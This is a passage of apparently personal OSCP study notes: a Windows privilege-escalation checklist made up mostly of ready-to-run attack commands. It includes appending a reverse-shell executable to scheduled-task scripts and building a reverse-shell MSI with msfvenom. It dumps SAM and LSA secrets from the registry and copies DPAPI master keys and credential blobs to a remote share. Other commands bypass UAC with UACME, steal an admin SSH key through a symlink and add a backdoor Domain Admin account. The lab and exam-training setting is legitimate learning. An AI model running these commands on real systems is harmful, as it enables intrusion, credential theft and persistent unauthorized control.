schtasks /query /fo LIST /v
```

#### 2. Check permisions 
Check the permission on a target binary
```
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```


#### 3. Replace binary accordingly


#### Aditional notes 
Investigate a specific file or type 
```
schtasks /query /fo LIST /v | findstr /I ".ps1"
```

- [ ] Identify tasks with `RunAsUser = SYSTEM` or high-privilege accounts  
- [ ] Check if `TaskToRun` path is writable by current user  
```
accesschk.exe /accepteula -quvw "C:\Path\To\Binary.exe"
```
- [ ] Check if `TaskToRun` contains unquoted path with spaces  
(e.g., `C:\Program Files\Some App\app.exe`)

- [ ] Inspect task definition file for write permissions  
- `C:\Windows\System32\Tasks\<TaskName>`
```
accesschk.exe /accepteula -quvw "C:\Windows\System32\Tasks\<TaskName>"
```
- [ ] See if task can be triggered manually  
```
schtasks /run /tn "<TaskName>"
```
- [ ] Review user-owned tasks for persistence opportunities  
(e.g., tasks with `Author` or `RunAsUser` = current user`)

#### Check scripts which run repeatedly
- Need to be able to edit scripts 
- NEed to be executable by Priv User
- [ ] Check the ps1 file 
```
type C:\Some\script\with\Scheduled\Task.ps1
```
- [ ]  check if you can write to it?
```
accesschk.exe /accepteula -quvw "C:\Some\script\with\Scheduled\Task.ps1"
```
- [ ] Append the command to run your executable
```
echo C:\Privesc\Reverses.exe >> C:\Some\script\with\Scheduled\Task.ps1
```
Wait for the script to run or make it run.

---

## ⚠️ Startup Apps
Perhaps not for OSCP but if an admin logs ( eg via RDP) in they could launch a `shell.exe`

```
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User | Format-Table -AutoSize
```

```
wmic startup get caption,command,user
```

Additional registry locations worth checking  
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
```

Start up dirs

```
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
```

Then check the targets permissions 
```
icacls "C:\path\to\startup\binary.exe"
```


- [ ]  check if you can write to the startup?
```
accesschk.exe /accepteula -d "C:\ProgramData\microsoft\Windows\Start Menu\Programs\StartUp"
```

Create a shortcut . this can be done with a `.vbs` script which can launch our `shell.exe` . Might find one online?? [Like this one ](https://youtu.be/CZWyp8AKeGk?list=PLBf0hzazHTGMBgq3RXdGDNJjw9iEz-lKz&t=384)

---


## ⚠️  Passwords in the Registry

The Windows Registry is used ot store configuration information

https://www.youtube.com/watch?v=u-8b5eDEQ7Y&list=PLBf0hzazHTGMBgq3RXdGDNJjw9iEz-lKz&index=11


WinPEase Shines at this task 
```
winPEASx64.exe windowscreds
```
OR look in the winPEASe report section `Windows Credentials`

```
winPEASx64.exe filesinfo
```
or look for the  `Interesting files and registry`  section in the winPEAS output

### Manual Registry Search

<details>
  <summary>Below manual search checks in the registry you can make</summary>

Search the registry for terms like `password=`

Search "password=" in HKLM registry hive
```
reg query HKLM /f password= /t REG_SZ /s 
```

Search for "passw"
```
reg query HKLM /f passw /t REG_SZ /s
```

Search "password=" in HKCU hive
```
reg query HKCU /f password= /t REG_SZ /s
```
Search "password=" in all user profiles
```
reg query HKU /f password= /t REG_SZ /s 
```

The above are inefficient. What is more more efficient is being more specific.

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\winlogon"
```

Also 

- [ ] Contains user hashes (needs SYSTEM access)
```
reg query "HKLM\SAM\SAM" /s
```                     
- [ ] LSA secrets, including service creds
```
reg query "HKLM\SECURITY" /s
```                    
- [ ] Saved SSH creds in PuTTY sessions
```
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```  
- [ ] OpenSSH agent info, key paths
```
reg query "HKCU\Software\OpenSSH\Agent" /s
```      
- [ ] SNMP community strings
```
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
```  
- [ ] Possible Terminal Services creds
```
reg query "HKLM\SYSTEM\CurrentControlSet\Services\RDPWD\Parameters" /s
```  
- [ ] Auto login user/password
```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
```  
- [ ] VNC password (encrypted)
```
reg query "HKCU\Software\ORL\WinVNC3\Password"
```  
- [ ] RealVNC credentials
```
reg query "HKCU\Software\RealVNC\vncserver" /s
```  
- [ ] TightVNC password keys
```
reg query "HKCU\Software\TightVNC\Server" /s
```    
- [ ] Autostart malware/scripts
```
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /s
```  
- [ ] Per-user autostart commands
```
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /s
```  

</details>

Once discovered we can use winexe to get a shell
```
winexe -U 'admin%SuperSecretPassword' //10.10.10.10 cmd.exe
```

Or even better
```
psexec.py admin@10.10.10.10 cmd.exe
```
`....Proveide passowrd when promted.`



----

## ⚠️ Use of Stored Credentials

`cmdkey` is used to create, list and store creds. 
- [ ] Check for stored creds as follows . ?? `cmdkey /l`
```
cmdkey /list
```
- [ ]  List out any saved creds as the user we can try and use them to run thing like a reverse shell
```
runas /savedcred /user:Administrator C:\Privesc\Shell.exe
```


Sensitive Files in xampp

```
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

---


## ⚠️ Password Manager files anywhere

| Password Manager | File Extension |
|---|---|
| KeePass | `.kdbx` |
| LastPass | `.lpvault` |
| 1Password | `.opvault` |
| Dashlane | `.dash` |
| Bitwarden | `.json` |
| Password Safe | `.psafe3` |
| RoboForm | `.rfo` |
| Enpass | `.walletx` |
| NordPass | `.npvault` |

**kdbx Database files**

```
for /r "C:\" %F in (*.kdbx) do @echo %~fF
```

```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

---

## ⚠️ DPAPI Common Locations ( Data Protection API)

FIrst see Dedicated Checeklist Template file on DPAPI decryption with impacket

[Hacktricks](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html#what-is-dpapi)
```
C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\      # DPAPI master keys:
C:\Users\<user>\AppData\Local\Microsoft\Credentials\          # DPAPI credentials:
```
See HTB Puppy for Privesc 

eg :

```
*Evil-WinRM* PS C:\> copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407" \\10.10.16.75\share\masterkey_blob
*Evil-WinRM* PS C:\> copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9" \\10.10.16.75\share\credential_blob
```

See notes on [DPAPI Cracking here](https://github.com/BaronSam3di/OSCP-COURSE-Notes/blob/main/OSCP-Obsidian-Vault/HackingSnippets-2024.md#dpapi-cracking)

---

## ⚠️ Search for Data base files
Maybe in paths simiar to the `Stickynotes`  path for jeff in `Offsec ROBUST`

Best with Powershell and cgi 
```
P:> gci 'C:\' -Recurse -Filter '*.sqlite' -Force -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
```

```
for /r "C:\" %F in (*.sqlite) do @echo %~fF
```

Maybe also : search for `.mdf`,`.ndf`,`.ldf`,`.mdb`,`.accdb`,`.sqlite`,`.sqlite3`,`.db`,`.edb`,`.sdf`

## ⚠️ Search for Compressed/archive files
As in `Offsec vector`

Best with Powershell and cgi 
```
P:> gci 'C:\' -Recurse -Filter '*.zip' -Force -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
```

```
for /r "C:\" %F in (*.zip) do @echo %~fF
```

Maybe also : search for `.rar`,`.rar`,`.7z`,`.cab`,`.msi`.


## ⚠️  Exploiting AutoRun Programs
`Autoruns` start services upon boot the system.

Requirements:
- System needs to have Auto runs configured during start up
- The program path needs to be modifiable by the user we so we can replace it

### Manually
FIrst Check for AutoRuns. search for Global System wide and subkeys recursively:
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run /s 
```
Maybe the current logged in user and subkeys recursively , search in the `HKCU` instead of `HKLM`

Next Ientify permissions. 
```
accesschk.exe /accepteula -wvu <PATH_CANDIDATE_SERVICE_NAME>
```
Eg
```
accesschk.exe /accepteula -wvu "C:\Path\To\Insecure\Servicebinary.exe"
```

#### Auto
WinPEAS has an Autoruns section and also in the WMI section of its output

**Lastly ; Reboot the system**

----

## ⚠️  Exploiting `AlwaysInstallElevated` Feature

`AlwaysInstallElevated` is a flag in the registry which will be set to `1` if new software is installed as the system . IF the flag is `0x1` , we can run a malicious installer to get a reverse shell

WinPEAS has a Check: `Checking AlwaysInstallElevated`

Check System Level *Local Machine*:
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
```

Check *Current User* level :
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
```
Create malicious Payload 
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o reverse.msi
```
- Run the payload on a Windows machine with:
```bash
msiexec /quiet /qn /i c:\Privesc\reverse.msi
```
This command installs the MSI package silently, without any user interface.

----

## ⚠️ Exploiting Insecure GUI Apps to launch shells

Explore GUI apps `SomeBinary.exe` which can run other software or open files and see if you can open things like `cmd.exe`

- [ ] Check the permission of who is running it with :
```
tasklist /V | findstr SomeBinary.exe
```
Also; with the GUI we can also look in `TaskManager` >> Details >> sort by `User name`  

---

## ⚠️  Windows kernel exploit  search


Manual Search ( best) 

- [ ] `P:>` 
```
Get-HotFix | Sort-Object InstalledOn -Descending
```

- [ ] `C:>`
```
wmic qfe list
```

**Find the most recent Cumulative Update**
Then compare the most recent applied pathc to the most recent patch on the microsoft site

### WXP alias 
See the windows exploit suggester script or its alias `wxp`
`/OSCP-Obsidian-Vault/TOOLS/Linux-Tools/WindowsExploitSuggesterScript.sh`
requires: 
- a `systeminfo > systeminfo.txt` file
- `P:> wmic qfe get Caption,Description,HotFixID,InstalledOn > qfe.txt`

Once those files are on the attack machine, run 
```
wxp
```

---

## ⚠️ By Pass UAC (User Account Control)

UAC can be seen when you are asked for your credentials as a memebr of the Administrators on a system. It involes the windows `FODhelper`

Conditions
- We are a user account with access to the Administrators Group.
- UAC level set on the target to default or Low

UACME Tool - https://github.com/hfiref0x/UACME works by abusing built-in Windows AutoElevate backdoor.

First Identify the method you are going to use from [the list here](https://github.com/hfiref0x/UACME?tab=readme-ov-file#examples) : 
```
akagi32.exe <METHOD> <BINARY-TO_RUN>
```
Then run Akagi (UACME) with the method and the binary you want to run to get all the privs
```
akagi32.exe 23 c:\UAC\bypass\shell.exe
```


---

## ⚠️ PrivescCheck .ps1 
- https://github.com/itm4n/PrivescCheck?tab=readme-ov-file
```
certutil -urlcache -split -f http://192.168.45.202/PrivescCheck.ps1
```

Basic Check
```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck PrivescCheck_Basic_$($env:COMPUTERNAME) -Format TXT,HTML"
```

Extended
```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_Extended_$($env:COMPUTERNAME) -Format TXT,HTML"
```

Experimental
```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_Experimental_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"
```

---


## ⚠️ Windows Symbolic Link exploit
If we find a sensitive file is being backed up or exposed in some way we could create a symbolic link between the legit target file and another file we want to read such as an admin ssh key. This [tool kit](https://github.com/googleprojectzero/symboliclink-testing-tools/releases/download/v1.0/Release.7z) is saved locally in `/home/kali/tools/SymbolicLink_TestingTools` . 
(Also this set of tools too :  https://github.com/p1sc3s/Symlink-Tools-Compiled- Used in OSPG - Fish (CVE-2019-18194))

#### Note: There are subtle nuances so its best to all of this in powershell

0. lets say the victim has a script like `backup.ps1`:
```
p4yl0ad@SYMBOLIC C:\Windows\Tasks>type \backup\backup.ps1 

$log = "C:\xampp\htdocs\logs\request.log" 
$backup = "C:\backup\logs"

while($true) {
        # Grabbing Backup
        copy $log $backup\$(get-date -f MM-dd-yyyy_HH_mm_s)
        Start-Sleep -s 60
}
```

1. Confirm a Writable path and check the permissions of the location:
```
Get-Acl C:\xampp\htdocs\logs | fl
```

or with `icacls .` look for `F` , `AD` , `WD`

2. Get the `CreateSymlink.exe` tool on the box
```
certutil -urlcache -split -f http://192.168.45.202/CreateSymlink.exe
```

3. We need to delete the existing files and anything in the directory so the directroy becomes a mount point else we will get `Error creating junction 145` : eg 
```
del C:\xampp\htdocs\logs\
```

4. Then create our symlink eg: `./CreateSymlink.exe "C:\LEGIT\FILE\BEING\BACKEDUP.log" "C:\File\WeWant\Administrator\.ssh\id_rsa"`

**🛑 Note!!!:** The symlink will **ONLY** exist whilst the tool is running so we leave it and wait for the update cycle. `" .... 00000158 Press ENTER to exit and delete the symlink"`

```
./CreateSymlink.exe "C:\xampp\htdocs\logs\request.log" "C:\Users\Administrator\.ssh\id_rsa"
```

NOTE: In situations like this , its best to transfer ther file over directly , rather than copy the contens of the file into a new key. 
AlSO: Look out for trailing whitespaces at the end of lines breaking the id_rsa key's formatting erros lke `Load key "id_rsa": invalid format`


---


## NEW ADMIN USER (Local/Domain)
```
net user clive Tuesday@2 /add
```
```
net localgroup administrators clive /add
```
```
net group "Domain Admins" clive /add /domain
```